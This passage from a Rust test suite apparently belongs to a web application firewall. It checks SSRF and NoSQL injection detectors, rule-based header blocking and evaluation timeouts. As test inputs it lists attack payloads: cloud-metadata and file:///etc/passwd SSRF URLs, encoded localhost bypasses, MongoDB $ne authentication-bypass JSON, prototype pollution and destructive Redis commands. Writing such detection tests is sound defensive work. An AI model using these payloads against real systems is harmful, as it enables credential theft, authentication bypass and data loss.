        // IPv6 localhost
        assert!(
            ssrf_analyzer_score("http://[::1]/") > 0,
            "Should detect ::1"
        );
        assert!(
            ssrf_analyzer_score("http://[0:0:0:0:0:0:0:1]/") > 0,
            "Should detect full IPv6 localhost"
        );
    }

    /// Test SSRF detection for cloud metadata endpoints.
    #[test]
    fn test_ssrf_analyzer_cloud_metadata() {
        // AWS/Azure/GCP metadata
        assert!(
            ssrf_analyzer_score("http://169.254.169.254/latest/meta-data/") > 0,
            "Should detect AWS metadata endpoint"
        );
        assert!(
            ssrf_analyzer_score("http://169.254.170.2/v2/credentials") > 0,
            "Should detect AWS ECS metadata"
        );
        assert!(
            ssrf_analyzer_score("http://metadata.google.internal/") > 0,
            "Should detect GCP metadata hostname"
        );
        assert!(
            ssrf_analyzer_score("http://metadata.azure.com/") > 0,
            "Should detect Azure metadata hostname"
        );
    }

    /// Test SSRF detection for private IP ranges.
    #[test]
    fn test_ssrf_analyzer_private_ips() {
        // 10.0.0.0/8
        assert!(
            ssrf_analyzer_score("http://10.0.0.1/internal") > 0,
            "Should detect 10.x.x.x"
        );
        assert!(
            ssrf_analyzer_score("http://10.255.255.255/") > 0,
            "Should detect 10.255.255.255"
        );

        // 192.168.0.0/16
        assert!(
            ssrf_analyzer_score("http://192.168.1.1/") > 0,
            "Should detect 192.168.x.x"
        );
        assert!(
            ssrf_analyzer_score("http://192.168.0.254:3000/") > 0,
            "Should detect with port"
        );

        // 172.16.0.0/12
        assert!(
            ssrf_analyzer_score("http://172.16.0.1/") > 0,
            "Should detect 172.16.x.x"
        );
        assert!(
            ssrf_analyzer_score("http://172.31.255.255/") > 0,
            "Should detect 172.31.x.x"
        );
    }

    /// Test SSRF detection for dangerous URL schemes.
    #[test]
    fn test_ssrf_analyzer_dangerous_schemes() {
        assert!(
            ssrf_analyzer_score("file:///etc/passwd") > 0,
            "Should detect file://"
        );
        assert!(
            ssrf_analyzer_score("gopher://internal:1234/") > 0,
            "Should detect gopher://"
        );
        assert!(
            ssrf_analyzer_score("dict://localhost:11211/") > 0,
            "Should detect dict://"
        );
        assert!(
            ssrf_analyzer_score("ldap://internal/") > 0,
            "Should detect ldap://"
        );
        assert!(
            ssrf_analyzer_score("expect://id") > 0,
            "Should detect expect://"
        );
        assert!(
            ssrf_analyzer_score("php://filter/convert.base64-encode") > 0,
            "Should detect php://"
        );
        assert!(
            ssrf_analyzer_score("data:text/html,<script>") > 0,
            "Should detect data:"
        );
    }

    /// Test SSRF detection for IPv6-mapped IPv4 bypass attempts.
    #[test]
    fn test_ssrf_analyzer_ipv6_mapped() {
        // IPv6-mapped localhost
        assert!(
            ssrf_analyzer_score("http://[::ffff:127.0.0.1]/") > 0,
            "Should detect IPv6-mapped localhost"
        );
        // IPv6-mapped private IP
        assert!(
            ssrf_analyzer_score("http://[::ffff:192.168.1.1]/") > 0,
            "Should detect IPv6-mapped private IP"
        );
        // IPv6-mapped cloud metadata
        assert!(
            ssrf_analyzer_score("http://[::ffff:169.254.169.254]/") > 0,
            "Should detect IPv6-mapped metadata"
        );
    }

    /// Test SSRF detection for encoded IP bypasses.
    #[test]
    fn test_ssrf_analyzer_encoded_ip() {
        // Decimal localhost: 2130706433 = 127.0.0.1
        assert!(
            ssrf_analyzer_score("http://2130706433/") > 0,
            "Should detect decimal IP (127.0.0.1)"
        );
        // Hex localhost: 0x7f000001 = 127.0.0.1
        assert!(
            ssrf_analyzer_score("http://0x7f000001/") > 0,
            "Should detect hex IP (127.0.0.1)"
        );
    }

    /// Test SSRF detection for URL-encoded bypasses.
    #[test]
    fn test_ssrf_analyzer_url_encoded() {
        // URL-encoded localhost
        assert!(
            ssrf_analyzer_score("http%3a%2f%2f127.0.0.1%2f") > 0,
            "Should detect URL-encoded SSRF"
        );
        // Double-encoded
        assert!(
            ssrf_analyzer_score("http%253a%252f%252f127.0.0.1") > 0,
            "Should detect double-encoded SSRF"
        );
    }

    /// Test that legitimate URLs are not flagged as SSRF.
    #[test]
    fn test_ssrf_analyzer_false_positives() {
        // Public IPs
        assert!(
            ssrf_analyzer_score("http://8.8.8.8/") == 0,
            "Should not flag public IP"
        );
        assert!(
            ssrf_analyzer_score("https://google.com/") == 0,
            "Should not flag domain"
        );
        assert!(
            ssrf_analyzer_score("http://example.com/api/data") == 0,
            "Should not flag normal URL"
        );
        // Normal content
        assert!(
            ssrf_analyzer_score("user submitted text") == 0,
            "Should not flag normal text"
        );
        assert!(
            ssrf_analyzer_score("192.168.1.1 is a private IP") == 0,
            "Should not flag IP without URL context"
        );
    }

    // ==================== NoSQL Injection Detection Tests ====================

    /// Test NoSQL detection for MongoDB operator injection.
    #[test]
    fn test_nosql_analyzer_mongo_operators() {
        // MongoDB operators
        assert!(
            nosql_analyzer_score(r#"{"username": {"$ne": null}}"#) > 0,
            "Should detect $ne operator"
        );
        assert!(
            nosql_analyzer_score(r#"{"age": {"$gt": 18}}"#) > 0,
            "Should detect $gt operator"
        );
        assert!(
            nosql_analyzer_score(r#"{"name": {"$regex": ".*"}}"#) > 0,
            "Should detect $regex operator"
        );
        assert!(
            nosql_analyzer_score(r#"{"$or": [{"a": 1}, {"b": 2}]}"#) > 0,
            "Should detect $or operator"
        );
    }

    /// Test NoSQL detection for MongoDB $where JavaScript execution (HIGH RISK).
    #[test]
    fn test_nosql_analyzer_where_js() {
        // $where with JavaScript function (CRITICAL)
        assert!(
            nosql_analyzer_score(r#"{"$where": "function() { return true; }"}"#) > 0,
            "Should detect $where with function"
        );
        assert!(
            nosql_analyzer_score(r#"{"$where": "this.password == 'test'"}"#) > 0,
            "Should detect $where with this keyword"
        );
        assert!(
            nosql_analyzer_score(r#"{"$where": "sleep(5000)"}"#) > 0,
            "Should detect $where with sleep (DoS)"
        );
    }

    /// Test NoSQL detection for MongoDB authentication bypass.
    #[test]
    fn test_nosql_analyzer_auth_bypass() {
        // Authentication bypass patterns
        assert!(
            nosql_analyzer_score(r#"{"password": {"$ne": ""}}"#) > 0,
            "Should detect password $ne bypass"
        );
        assert!(
            nosql_analyzer_score(r#"{"username": "admin", "password": {"$gt": ""}}"#) > 0,
            "Should detect password $gt bypass"
        );
        assert!(
            nosql_analyzer_score(r#"{"user": {"$exists": true}}"#) > 0,
            "Should detect user $exists bypass"
        );
    }

    /// Test NoSQL detection for prototype pollution.
    #[test]
    fn test_nosql_analyzer_proto_pollution() {
        // Prototype pollution (can lead to RCE)
        assert!(
            nosql_analyzer_score(r#"{"__proto__": {"isAdmin": true}}"#) > 0,
            "Should detect __proto__ pollution"
        );
        assert!(
            nosql_analyzer_score(r#"{"constructor": {"prototype": {}}}"#) > 0,
            "Should detect constructor pollution"
        );
        assert!(
            nosql_analyzer_score(r#"{"prototype": {"polluted": true}}"#) > 0,
            "Should detect direct prototype pollution"
        );
    }

    /// Test NoSQL detection for CouchDB special endpoints.
    #[test]
    fn test_nosql_analyzer_couchdb() {
        assert!(
            nosql_analyzer_score("/_all_docs") > 0,
            "Should detect _all_docs endpoint"
        );
        assert!(
            nosql_analyzer_score("/_design/mydesign/_view/myview") > 0,
            "Should detect _design/_view endpoints"
        );
        assert!(
            nosql_analyzer_score("/_changes?since=0") > 0,
            "Should detect _changes endpoint"
        );
    }

    /// Test NoSQL detection for Redis dangerous commands.
    #[test]
    fn test_nosql_analyzer_redis() {
        assert!(
            nosql_analyzer_score("EVAL \"return 1\" 0") > 0,
            "Should detect EVAL command"
        );
        assert!(
            nosql_analyzer_score("FLUSHALL") > 0,
            "Should detect FLUSHALL command"
        );
        assert!(
            nosql_analyzer_score("CONFIG SET dir /tmp") > 0,
            "Should detect CONFIG command"
        );
        assert!(
            nosql_analyzer_score("KEYS *") > 0,
            "Should detect KEYS command"
        );
    }

    /// Test NoSQL detection for URL-encoded bypasses.
    #[test]
    fn test_nosql_analyzer_url_encoded() {
        // URL-encoded "$where": pattern (%24 = $, %22 = ", %3A = :)
        assert!(
            nosql_analyzer_score("%22%24where%22%3A") > 0,
            "Should detect URL-encoded \"$where\":"
        );
        // URL-encoded {"$ne": ""} pattern
        assert!(
            nosql_analyzer_score("%7B%22password%22%3A%7B%22%24ne%22%3A%22%22%7D%7D") > 0,
            "Should detect URL-encoded password $ne bypass"
        );
        // URL-encoded __proto__
        assert!(
            nosql_analyzer_score("%22__proto__%22%3A") > 0,
            "Should detect URL-encoded __proto__"
        );
    }

    /// Test that legitimate JSON queries are not flagged.
    #[test]
    fn test_nosql_analyzer_false_positives() {
        // Normal JSON
        assert!(
            nosql_analyzer_score(r#"{"name": "John", "age": 30}"#) == 0,
            "Should not flag normal JSON"
        );
        assert!(
            nosql_analyzer_score(r#"{"status": "active"}"#) == 0,
            "Should not flag simple key-value"
        );
        // Normal text
        assert!(
            nosql_analyzer_score("hello world") == 0,
            "Should not flag normal text"
        );
        assert!(
            nosql_analyzer_score("user@example.com") == 0,
            "Should not flag email"
        );
    }

    #[test]
    fn test_header_evaluation() {
        let mut engine = Engine::empty();
        let rules = r#"[
            {
                "id": 1,
                "description": "Block bad user-agent",
                "risk": 10.0,
                "blocking": true,
                "matches": [
                    {"type": "header", "field": "User-Agent", "match": {"type": "contains", "match": "bad-bot"}}
                ]
            }
        ]"#;
        engine.load_rules(rules.as_bytes()).unwrap();

        let verdict = engine.analyze(&Request {
            method: "GET",
            path: "/",
            headers: vec![Header::new("User-Agent", "bad-bot/1.0")],
            ..Default::default()
        });

        assert_eq!(verdict.action, Action::Block);
        assert!(verdict.matched_rules.contains(&1));
    }

    // ============ Timeout Tests ============

    #[test]
    fn test_analyze_safe_basic() {
        let mut engine = Engine::empty();
        let rules = r#"[
            {
                "id": 1,
                "description": "Simple match",
                "risk": 10.0,
                "matches": [{"type": "uri", "match": {"type": "contains", "match": "test"}}]
            }
        ]"#;
        engine.load_rules(rules.as_bytes()).unwrap();

        let verdict = engine.analyze_safe(&Request {
            method: "GET",
            path: "/test",
            ..Default::default()
        });

        // Normal requests should complete without timeout
        assert!(!verdict.timed_out);
        assert!(verdict.rules_evaluated.is_none());
        assert!(verdict.matched_rules.contains(&1));
    }

    #[test]
    fn test_analyze_with_timeout_custom() {
        let mut engine = Engine::empty();
        let rules = r#"[
            {
                "id": 1,
                "description": "Simple match",
                "risk": 10.0,
                "matches": [{"type": "uri", "match": {"type": "contains", "match": "test"}}]
            }
        ]"#;
        engine.load_rules(rules.as_bytes()).unwrap();

        let verdict = engine.analyze_with_timeout(
            &Request {
                method: "GET",
                path: "/test",
                ..Default::default()
            },
            Duration::from_millis(100),
        );

        // Normal request should not timeout
        assert!(!verdict.timed_out);
    }

    #[test]
    fn test_timeout_cap() {
        // Verify MAX_EVAL_TIMEOUT is respected
        assert!(MAX_EVAL_TIMEOUT >= DEFAULT_EVAL_TIMEOUT);
        assert!(MAX_EVAL_TIMEOUT <= Duration::from_secs(1)); // Sanity check
    }

    #[test]
    fn test_verdict_timeout_fields_default() {
        let verdict = Verdict::default();
        assert!(!verdict.timed_out);
        assert!(verdict.rules_evaluated.is_none());
    }

    #[test]
    fn test_eval_context_deadline() {
        let req = Request {
            method: "GET",
            path: "/test",
            ..Default::default()
        };

        // Without deadline
        let ctx = EvalContext::from_request(&req);
        assert!(ctx.deadline.is_none());
        assert!(!ctx.is_deadline_exceeded());

        // With future deadline
        let future_deadline = Instant::now() + Duration::from_secs(10);
        let ctx_with_deadline = EvalContext::from_request_with_deadline(&req, future_deadline);
        assert!(ctx_with_deadline.deadline.is_some());
        assert!(!ctx_with_deadline.is_deadline_exceeded());

        // With past deadline
        let past_deadline = Instant::now() - Duration::from_millis(1);
        let ctx_expired = EvalContext::from_request_with_deadline(&req, past_deadline);
        assert!(ctx_expired.is_deadline_exceeded());
    }

    #[test]
    fn test_load_rules_regex_error() {
        let mut engine = Engine::empty();
        // Invalid regex (missing closing bracket)
        let rules = r#"[
            {
                "id": 1,
                "description": "Invalid regex",
                "risk": 10.0,
                "matches": [
                    {
                        "type": "uri",
                        "match": {
                            "type": "regex",
                            "match": "["
                        }
                    }
                ]
            }
        ]"#;
        let result = engine.load_rules(rules.as_bytes());
        assert!(result.is_err());
        match result {
            Err(WafError::RegexError(msg)) => assert!(msg.contains("[")),
            _ => panic!("Expected RegexError, got {:?}", result),
        }
    }
}
